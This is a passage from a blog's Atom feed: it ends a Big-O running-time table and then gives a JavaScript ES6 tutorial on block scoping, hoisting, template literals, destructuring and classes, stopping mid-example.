<th>O(n!)</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
</tr>
<tr>
<td>10</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="orange">4 sec</td>
</tr>
<tr>
<td>100</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="red">40170 trillion years</td>
<td class="red">&gt; vigintillion years</td>
</tr>
<tr>
<td>1,000</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="red">&gt; vigintillion years</td>
<td class="red">&gt; centillion years</td>
</tr>
<tr>
<td>10,000</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="orange">2 min</td>
<td class="red">&gt; centillion years</td>
<td class="red">&gt; centillion years</td>
</tr>
<tr>
<td>100,000</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="orange">1 sec</td>
<td class="orange">3 hours</td>
<td class="red">&gt; centillion years</td>
<td class="red">&gt; centillion years</td>
</tr>
<tr>
<td>1,000,000</td>
<td class="green">&lt; 1 sec</td>
<td class="green">&lt; 1 sec</td>
<td class="orange">1 sec</td>
<td class="orange">20 sec</td>
<td class="orange">12 days</td>
<td class="red">&gt; centillion years</td>
<td class="red">&gt; centillion years</td>
</tr>
</tbody>
</table>

</div>

<figcaption class="figcaption">Assuming: 1 GHz CPU and that it can execute on average one instruction in 1 nanosecond (usually takes more time). Also, bear in mind that each line might be translated into dozens of CPU instructions depending on the programming language</figcaption>

<p>As you can see, some algorithms are very time-consuming. An input size as little as 100, it is impossible to compute even if we had a 1 PHz (1 million GHz) CPU!! Hardware does not scale as well as software.</p>
<p>In the next post, we are going to explore all of these time complexities with a code example or two!
Are you ready to become a super programmer and scale your code?! <img src="/images/superman_shield.svg" width="25" height="25" alt="superman shield" style="display:inline-block;"></p>
<p><strong>Continue with the next part üëâ</strong> <a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight running times that every programmer should know</a></p>
<!--

Improvement ideas:

- https://www.reddit.com/r/compsci/comments/8elqsc/algorithms_tutorial_series_for_beginners/dxwb2n6/
Overall a good introduction. You could go into a bit more detail of why the constant is ignored. Perhaps a plot of a few linear functions next to a quadratic one, to illustrate that for different values of all the linear functions are the same compared to the quadratic function.
I like your table of runtimes. It gives a proper perspective about why this matters :)

https://news.ycombinator.com/item?id=16941645

Titles:
23 Algorithms tutorial series for beginners - https://www.reddit.com/r/compsci/comments/8elqsc/algorithms_tutorial_series_for_beginners/
0 How you can change the world by learning Data Structures and Algorithms -


-->
]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML&quot; async&gt;&lt;/script&gt;

&lt;p&gt;As a developer, you have the power to change the world! You can write programs that enable new technologies and work in software to find an earlier diagnosis of diseases for instance. Also, you might create a project to free up people‚Äôs time to do other amazing things. Whatever you do, it has the potential to impact the community who use it.&lt;/p&gt;
&lt;!-- Millions of people might use some applications (e.g., Google,
Baidu, Youtube, Facebook). --&gt;
&lt;p&gt;However, these accomplishments are only possible if we write software that is fast and can scale. Learning how to measure your code performance is the goal of this online course.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Overview of JavaScript ES6 features (a.k.a ECMAScript 6 and ES2015+)</title>
    <link href="https://adrianmejia.com/blog/2016/10/19/Overview-of-JavaScript-ES6-features-a-k-a-ECMAScript-6-and-ES2015/"/>
    <id>https://adrianmejia.com/blog/2016/10/19/Overview-of-JavaScript-ES6-features-a-k-a-ECMAScript-6-and-ES2015/</id>
    <published>2016-10-19T21:01:34.000Z</published>
    <updated>2016-10-25T16:02:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript has changed quite a bit in the last years. These are 12 new features that you can start using today!</p>
<h1 id="JavaScript-History">JavaScript History<a href="#JavaScript-History" class="headerlink" title="JavaScript History"></a></h1><p>The new additions to the language are called ECMAScript 6. It is also referred as ES6 or ES2015+.</p>
<p>Since JavaScript conception on 1995, it has been evolving slowly. New additions happened every few years. ECMAScript came to be in 1997 to guide the path of JavaScript. It has been releasing versions such as ES3, ES5, ES6 and so on.</p>
<img src="/images/history-javascript-evolution-es6.png" title="History of JavaScript Evolution">
<p>As you can see, there are gaps of 10 and 6 years between the ES3, ES5, and ES6. The new model is to make small incremental changes every year. Instead of doing massive changes at once like happened with ES6.</p>
<h1 id="Browsers-Support">Browsers Support<a href="#Browsers-Support" class="headerlink" title="Browsers Support"></a></h1><p>All modern browser and environments support ES6 already!</p>
<img src="/images/es6-javascript-support.png" title="ES6 Support">
<p><small>source: <a href="https://kangax.github.io/compat-table/es6/" target="_blank" rel="noopener">https://kangax.github.io/compat-table/es6/</a></small></p>
<p>Chrome, MS Edge, Firefox, Safari, Node and many others have already built-in support for most of the features of JavaScript ES6. So, everything that you are going to learn in this tutorial you can start using it right now.</p>
<p>Let‚Äôs get started with ECMAScript 6!</p>
<h1 id="Core-ES6-Features">Core ES6 Features<a href="#Core-ES6-Features" class="headerlink" title="Core ES6 Features"></a></h1><p>You can test all these code snippets on your browser console!</p>
<img src="/images/javascript-es6-classes-on-browser-console.png" title="Testing Javascript ES6 classes on browser console">
<p>So don‚Äôt take my word and test every ES5 and ES6 example. Let‚Äôs dig in üí™</p>
<h2 id="Block-scope-variables">Block scope variables<a href="#Block-scope-variables" class="headerlink" title="Block scope variables"></a></h2><p>With ES6, we went from declaring variables with <code>var</code> to  use <code>let</code>/<code>const</code>.</p>
<p>What was wrong with <code>var</code>?</p>
<p>The issue with <code>var</code> is the variable leaks into other code block such as <code>for</code> loops or <code>if</code> blocks.</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">'outer'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">inner</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (inner) &#123;</span><br><span class="line marked">    <span class="keyword">var</span> x = <span class="string">'inner'</span>; <span class="comment">// scope whole function</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x; <span class="comment">// gets redefined because line 4 declaration is hoisted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">test(<span class="literal">false</span>); <span class="comment">// undefined üò±</span></span><br><span class="line">test(<span class="literal">true</span>); <span class="comment">// inner</span></span><br></pre></td></tr></table></figure>
<p>For <code>test(false)</code> you would expect to return <code>outer</code>, BUT NO, you get <code>undefined</code>.</p>
<p>Why?</p>
<p>Because even though the if-block is not executed, the expression <code>var x</code> in line 4 is hoisted.</p>
<blockquote>
<p>var <strong>hoisting</strong>:</p>
<ul>
<li><code>var</code> is function scoped. It is availble in the whole function even before being declared.</li>
<li>Declarations are Hoisted. So you can use a variable before it has been declared.</li>
<li>Initializations are NOT hoisted. If you are using <code>var</code> ALWAYS declare your variables at the top.</li>
<li>After applying the rules of hoisting we can understand better what‚Äôs happening:<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">'outer'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">inner</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">var</span> x; <span class="comment">// HOISTED DECLARATION</span></span><br><span class="line">  <span class="keyword">if</span> (inner) &#123;</span><br><span class="line marked">    x = <span class="string">'inner'</span>; <span class="comment">// INITIALIZATION NOT HOISTED</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p>ECMAScript 2015 comes to the rescue:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="keyword">let</span> x = <span class="string">'outer'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">inner</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (inner) &#123;</span><br><span class="line marked">    <span class="keyword">let</span> x = <span class="string">'inner'</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x; <span class="comment">// gets result from line 1 as expected</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="literal">false</span>); <span class="comment">// outer</span></span><br><span class="line">test(<span class="literal">true</span>); <span class="comment">// inner</span></span><br></pre></td></tr></table></figure>
<p>Changing <code>var</code> for <code>let</code> makes things work as expected. If the <code>if</code> block is not called the variable <code>x</code> doesn‚Äôt get hoisted out of the block.</p>
<blockquote>
<p>Let <strong>hoisting</strong> and ‚Äútemporal dead zone‚Äù</p>
<ul>
<li>In ES6, <code>let</code> will hoist the variable to the top of the block (NOT at the top of function like ES5).</li>
<li>However, referencing the variable in the block before the variable declaration results in a <code>ReferenceError</code>.</li>
<li><code>let</code> is blocked scoped. You cannot use it before it is declared.</li>
<li>‚ÄúTemporal dead zone‚Äù is the zone from the start of the block until the variable is declared.</li>
</ul>
</blockquote>
<p><strong>IIFE</strong></p>
<p>Let‚Äôs show an example before explaining <abbr title="immediately-invoked function expressionn">IIFE</abbr>. Take a look here:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line marked">  <span class="keyword">var</span> private = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(private); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>As you can see, <code>private</code> leaks out. You need to use <abbr title="immediately-invoked function expressionn">IIFE</abbr> (immediately-invoked function expression) to contain it:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line marked">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> private2 = <span class="number">1</span>;</span><br><span class="line marked">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(private2); <span class="comment">// Uncaught ReferenceError</span></span><br></pre></td></tr></table></figure>
<p>If you take a look at jQuery/lodash or other open source projects you will notice they have <abbr title="immediately-invoked function expression">IIFE</abbr> to avoid polluting the global environment and just defining on global such as <code>_</code>, <code>$</code> or <code>jQuery</code>.</p>
<p>On ES6 is much cleaner, We also don‚Äôt need to use <abbr title="immediately-invoked function expression">IIFE</abbr> anymore when we can just use blocks and <code>let</code>:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line marked">  <span class="keyword">let</span> private3 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(private3); <span class="comment">// Uncaught ReferenceError</span></span><br></pre></td></tr></table></figure>
<p><strong>Const</strong></p>
<p>You can also use <code>const</code> if you don‚Äôt want a variable to change at all.</p>
<img src="/images/javascript-es6-const-variables-example.png" title="const variable example">
<blockquote>
<p>Bottom line: ditch <code>var</code> for <code>let</code> and <code>const</code>.</p>
<ul>
<li>Use <code>const</code> for all your references; avoid using <code>var</code>.</li>
<li>If you must reassign references, use <code>let</code> instead of <code>const</code>.</li>
</ul>
</blockquote>
<h2 id="Template-Literals">Template Literals<a href="#Template-Literals" class="headerlink" title="Template Literals"></a></h2><p>We don‚Äôt have to do more nesting concatenations when we have template literals. Take a look:</p>
<figure class="highlight javascript"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> first = <span class="string">'Adrian'</span>;</span><br><span class="line"><span class="keyword">var</span> last = <span class="string">'Mejia'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Your name is '</span> + first + <span class="string">' '</span> + last + <span class="string">'.'</span>);</span><br></pre></td></tr></table></figure>
<p>Now you can use backtick (`) and string interpolation <code>${}</code>:</p>
<figure class="highlight javascript"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> first = <span class="string">'Adrian'</span>;</span><br><span class="line"><span class="keyword">const</span> last = <span class="string">'Mejia'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Your name is <span class="subst">$&#123;first&#125;</span> <span class="subst">$&#123;last&#125;</span>.`</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Multi-line-strings">Multi-line strings<a href="#Multi-line-strings" class="headerlink" title="Multi-line strings"></a></h2><p>We don‚Äôt have to concatenate strings + <code>\n</code> anymore like this:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> template = <span class="string">'&lt;li *ngFor="let todo of todos" [ngClass]="&#123;completed: todo.isDone&#125;" &gt;\n'</span> +</span><br><span class="line"><span class="string">'  &lt;div class="view"&gt;\n'</span> +</span><br><span class="line"><span class="string">'    &lt;input class="toggle" type="checkbox" [checked]="todo.isDone"&gt;\n'</span> +</span><br><span class="line"><span class="string">'    &lt;label&gt;&lt;/label&gt;\n'</span> +</span><br><span class="line"><span class="string">'    &lt;button class="destroy"&gt;&lt;/button&gt;\n'</span> +</span><br><span class="line"><span class="string">'  &lt;/div&gt;\n'</span> +</span><br><span class="line"><span class="string">'  &lt;input class="edit" value=""&gt;\n'</span> +</span><br><span class="line"><span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(template);</span><br></pre></td></tr></table></figure>
<p>On ES6 we can use the backtick again to solve this:</p>
<figure class="highlight plain"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const template = `&lt;li *ngFor=&quot;let todo of todos&quot; [ngClass]=&quot;&#123;completed: todo.isDone&#125;&quot; &gt;</span><br><span class="line">  &lt;div class=&quot;view&quot;&gt;</span><br><span class="line">    &lt;input class=&quot;toggle&quot; type=&quot;checkbox&quot; [checked]=&quot;todo.isDone&quot;&gt;</span><br><span class="line">    &lt;label&gt;&lt;/label&gt;</span><br><span class="line">    &lt;button class=&quot;destroy&quot;&gt;&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;input class=&quot;edit&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;/li&gt;`;</span><br><span class="line">console.log(template);</span><br></pre></td></tr></table></figure>
<p>Both pieces of code will have exactly the same result.</p>
<h2 id="Destructuring-Assignment">Destructuring Assignment<a href="#Destructuring-Assignment" class="headerlink" title="Destructuring Assignment"></a></h2><p>ES6 desctructing is very useful and consise. Follow this examples:</p>
<p><strong>Getting elements from an arrays</strong></p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">var</span> first = array[<span class="number">0</span>];</span><br><span class="line marked"><span class="keyword">var</span> third = array[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(first, third); <span class="comment">// 1 3</span></span><br></pre></td></tr></table></figure>
<p>Same as:</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">const</span> [first, ,third] = array;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(first, third); <span class="comment">// 1 3</span></span><br></pre></td></tr></table></figure>
<p><strong>Swapping values</strong></p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">var</span> tmp = a;</span><br><span class="line marked">a = b;</span><br><span class="line marked">b = tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a, b); <span class="comment">// 2 1</span></span><br></pre></td></tr></table></figure>
<p>same as</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line marked">[a, b] = [b, a];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a, b); <span class="comment">// 2 1</span></span><br></pre></td></tr></table></figure>
<p><strong>Destructuring for multiple return values</strong></p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">margin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> left=<span class="number">1</span>, right=<span class="number">2</span>, top=<span class="number">3</span>, bottom=<span class="number">4</span>;</span><br><span class="line marked">  <span class="keyword">return</span> &#123; <span class="attr">left</span>: left, <span class="attr">right</span>: right, <span class="attr">top</span>: top, <span class="attr">bottom</span>: bottom &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = margin();</span><br><span class="line marked"><span class="keyword">var</span> left = data.left;</span><br><span class="line marked"><span class="keyword">var</span> bottom = data.bottom;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(left, bottom); <span class="comment">// 1 4</span></span><br></pre></td></tr></table></figure>
<p>In line 3, you could also return it in an array like this (and save some typing):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [left, right, top, bottom];</span><br></pre></td></tr></table></figure>
<p>but then, the caller needs to think about the order of return data.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> left = data[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> bottom = data[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>
<p>With ES6, the caller selects only the data they need (line 6):</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">margin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> left=<span class="number">1</span>, right=<span class="number">2</span>, top=<span class="number">3</span>, bottom=<span class="number">4</span>;</span><br><span class="line marked">  <span class="keyword">return</span> &#123; left, right, top, bottom &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">const</span> &#123; left, bottom &#125; = margin();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(left, bottom); <span class="comment">// 1 4</span></span><br></pre></td></tr></table></figure>
<p><em>Notice:</em> Line 3, we have some other ES6 features going on. We can compact <code>{ left: left }</code> to just <code>{ left }</code>. Look how much concise it is compare to the ES5 version. Isn‚Äôt that cool?</p>
<p><strong>Destructuring for parameters matching</strong></p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = &#123;<span class="attr">firstName</span>: <span class="string">'Adrian'</span>, <span class="attr">lastName</span>: <span class="string">'Mejia'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">var</span> firstName = user.firstName;</span><br><span class="line marked">  <span class="keyword">var</span> lastName = user.lastName;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> firstName + <span class="string">' '</span> + lastName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getFullName(user)); <span class="comment">// Adrian Mejia</span></span><br></pre></td></tr></table></figure>
<p>Same as (but more concise):</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;<span class="attr">firstName</span>: <span class="string">'Adrian'</span>, <span class="attr">lastName</span>: <span class="string">'Mejia'</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFullName</span>(<span class="params">&#123; firstName, lastName &#125;</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;firstName&#125;</span> <span class="subst">$&#123;lastName&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getFullName(user)); <span class="comment">// Adrian Mejia</span></span><br></pre></td></tr></table></figure>
<p><strong>Deep Matching</strong></p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">settings</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">display</span>: &#123; <span class="attr">color</span>: <span class="string">'red'</span> &#125;, <span class="attr">keyboard</span>: &#123; <span class="attr">layout</span>: <span class="string">'querty'</span>&#125; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp = settings();</span><br><span class="line marked"><span class="keyword">var</span> displayColor = tmp.display.color;</span><br><span class="line marked"><span class="keyword">var</span> keyboardLayout = tmp.keyboard.layout;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(displayColor, keyboardLayout); <span class="comment">// red querty</span></span><br></pre></td></tr></table></figure>
<p>Same as (but more concise):</p>
<figure class="highlight js"><figcaption><span>ES6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">settings</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">display</span>: &#123; <span class="attr">color</span>: <span class="string">'red'</span> &#125;, <span class="attr">keyboard</span>: &#123; <span class="attr">layout</span>: <span class="string">'querty'</span>&#125; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked"><span class="keyword">const</span> &#123; <span class="attr">display</span>: &#123; <span class="attr">color</span>: displayColor &#125;, <span class="attr">keyboard</span>: &#123; <span class="attr">layout</span>: keyboardLayout &#125;&#125; = settings();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(displayColor, keyboardLayout); <span class="comment">// red querty</span></span><br></pre></td></tr></table></figure>
<p>This is also called object destructing.</p>
<p>As you can see, destructing is very useful and encourages good coding styles.</p>
<blockquote>
<p>Best practices:</p>
<ul>
<li>Use array destructing to get elements out or swap variables. It saves you from creating temporary references.</li>
<li>Don‚Äôt use array destructuring for multiple return values, instead use object destructuring</li>
</ul>
</blockquote>
<h2 id="Classes-and-Objects">Classes and Objects<a href="#Classes-and-Objects" class="headerlink" title="Classes and Objects"></a></h2><p>With ECMAScript 6, We went from ‚Äúconstructor functions‚Äù üî® to ‚Äúclasses‚Äù üç∏.</p>
<blockquote>
<p>In JavaScript every single object has a prototype, which is another object.
All JavaScript objects inherit their methods and properties from their prototype.</p>
</blockquote>
<p>In ES5, we did Object Oriented programming (<abbr title="Object-Oriented Programming">OOP</abbr>) using constructor functions to create objects as follows:</p>
<figure class="highlight js"><figcaption><span>ES5</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="keyword">var</span> Animal = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">MyConstructor</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line marked">  MyConstructor.prototype.speak = <span class="function"><span class="keyword">function</span> <span class="title">speak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span 